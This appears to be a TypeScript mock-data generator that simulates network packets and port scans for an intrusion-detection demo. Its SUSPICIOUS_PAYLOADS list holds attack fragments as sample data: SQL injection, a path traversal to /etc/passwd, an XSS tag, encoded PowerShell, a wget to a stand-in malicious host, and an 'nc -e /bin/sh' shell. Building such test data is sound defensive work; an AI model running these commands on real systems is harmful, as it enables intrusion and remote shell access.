import { NetworkPacket } from '../types/network';

const COMMON_IPS = [
  '192.168.1.100', '192.168.1.101', '192.168.1.102', '10.0.0.50',
  '172.16.1.10', '203.0.113.45', '198.51.100.23', '192.0.2.100'
];

const BLACKLISTED_IPS = [
  '203.0.113.666', '198.51.100.999', '192.0.2.999', '10.0.0.666',
  '172.16.1.999', '185.220.101.42', '91.189.89.199', '185.234.218.7'
];

const PROTOCOLS: Array<NetworkPacket['protocol']> = ['TCP', 'UDP', 'HTTP', 'HTTPS', 'FTP', 'SSH', 'DNS', 'ICMP'];

const SUSPICIOUS_PAYLOADS = [
  'SELECT * FROM users WHERE',
  '../../../etc/passwd',
  '<script>alert("xss")</script>',
  'UNION SELECT password FROM',
  'cmd.exe /c',
  'powershell.exe -enc',
  'wget http://malicious.com',
  'nc -e /bin/sh'
];

const NORMAL_PAYLOADS = [
  'GET /index.html HTTP/1.1',
  'POST /api/login HTTP/1.1',
  'DNS query for google.com',
  'HTTPS handshake data',
  'File transfer request',
  'SSH authentication',
  'Database connection established',
  'API response data'
];

export function generateRandomPacket(): NetworkPacket {
  const isSuspicious = Math.random() < 0.15; // 15% chance of suspicious activity
  const isFromBlacklist = Math.random() < 0.08; // 8% chance from blacklisted IP
  
  const sourceIP = isFromBlacklist 
    ? BLACKLISTED_IPS[Math.floor(Math.random() * BLACKLISTED_IPS.length)]
    : COMMON_IPS[Math.floor(Math.random() * COMMON_IPS.length)];
  
  const destinationIP = COMMON_IPS[Math.floor(Math.random() * COMMON_IPS.length)];
  const protocol = PROTOCOLS[Math.floor(Math.random() * PROTOCOLS.length)];
  
  let sourcePort = Math.floor(Math.random() * 65535) + 1;
  let destinationPort = Math.floor(Math.random() * 65535) + 1;
  
  // Common ports
  if (Math.random() < 0.6) {
    const commonPorts = [80, 443, 22, 21, 25, 53, 110, 143, 993, 995];
    destinationPort = commonPorts[Math.floor(Math.random() * commonPorts.length)];
  }
  
  const payload = isSuspicious 
    ? SUSPICIOUS_PAYLOADS[Math.floor(Math.random() * SUSPICIOUS_PAYLOADS.length)]
    : NORMAL_PAYLOADS[Math.floor(Math.random() * NORMAL_PAYLOADS.length)];
  
  const flags = protocol === 'TCP' ? ['SYN', 'ACK', 'FIN', 'RST'].filter(() => Math.random() < 0.3) : undefined;
  
  return {
    id: `pkt_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
    timestamp: new Date(),
    sourceIP,
    destinationIP,
    sourcePort,
    destinationPort,
    protocol,
    payload,
    size: Math.floor(Math.random() * 1500) + 64,
    flags
  };
}

export function generatePortScanPackets(sourceIP: string, targetIP: string, count: number): NetworkPacket[] {
  const packets: NetworkPacket[] = [];
  const baseTime = Date.now();
  
  for (let i = 0; i < count; i++) {
    packets.push({
      id: `scan_${baseTime}_${i}`,
      timestamp: new Date(baseTime + i * 100),
      sourceIP,
      destinationIP: targetIP,
      sourcePort: Math.floor(Math.random() * 65535) + 1,
      destinationPort: i + 1,
      protocol: 'TCP',
      payload: 'SYN packet',
      size: 64,
      flags: ['SYN']
    });
  }
  
  return packets;
}